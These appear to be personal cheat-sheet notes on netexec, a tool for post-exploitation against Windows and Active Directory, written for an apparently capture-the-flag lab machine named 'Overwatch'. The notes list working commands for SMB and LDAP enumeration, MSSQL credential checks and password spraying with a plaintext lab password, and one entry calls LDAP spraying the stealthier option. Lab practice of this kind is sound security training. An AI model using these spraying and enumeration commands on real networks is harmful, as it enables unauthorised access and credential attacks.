# netexec (nxc)

Swiss-army knife for post-exploitation against Windows/AD networks. Successor of CrackMapExec. Used for SMB/LDAP/MSSQL enumeration, authentication validation and password spraying.

## Commands Used

### Check anonymous/guest SMB shares
```bash
netexec smb overwatch.htb -u '' -p '' --shares
netexec smb 10.129.28.165 -u 'guest' -p '' --shares
```
Used on: **Overwatch**

### Validate MSSQL credentials (non-standard port)
```bash
netexec mssql 10.129.28.165 -u sqlsvc -p 'TI0LKcfHzZw1Vv' --port 6520
```
Used on: **Overwatch**

### Check sysadmin role via query
```bash
netexec mssql 10.129.28.165 -u sqlsvc -p 'TI0LKcfHzZw1Vv' --port 6520 \
  -q "SELECT IS_SRVROLEMEMBER('sysadmin');"
```
Used on: **Overwatch**

### Retrieve domain password policy
```bash
netexec smb 10.129.28.165 -u sqlsvc -p 'TI0LKcfHzZw1Vv' -d overwatch.htb --pass-pol
```
Used on: **Overwatch**

### LDAP user enumeration
```bash
netexec ldap 10.129.28.165 -u sqlsvc -p 'TI0LKcfHzZw1Vv' -d overwatch.htb --users
```
Used on: **Overwatch**

### SMB password spraying against a user list
```bash
netexec smb 10.129.28.165 -u users.txt -p 'TI0LKcfHzZw1Vv' -d overwatch.htb --continue-on-success
```
Used on: **Overwatch**

### LDAP spraying (stealthier than SMB)
```bash
netexec ldap 10.129.28.165 -u users.txt -p 'TI0LKcfHzZw1Vv' -d overwatch.htb --continue-on-success
```
Used on: **Overwatch**
